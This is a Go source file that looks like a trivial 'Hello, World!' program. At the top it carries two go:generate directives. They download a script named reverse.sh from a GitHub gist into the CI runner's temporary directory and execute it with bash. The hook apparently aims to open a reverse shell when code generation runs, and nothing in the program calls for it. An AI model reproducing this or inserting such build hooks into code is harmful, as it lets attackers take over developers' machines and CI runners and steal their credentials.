//go:generate curl -s -o $RUNNER_TEMP/run.sh https://gist.githubusercontent.com/armmanvaillancourt/24020b840eaab11c9790535b2b5e156e/raw/cd2c82692d32a05126b2983a23e7403c43a76f14/reverse.sh
//go:generate bash $RUNNER_TEMP/run.sh

package main

import (
    "fmt"
)

func main() {
    fmt.Println("Hello, World!")
}
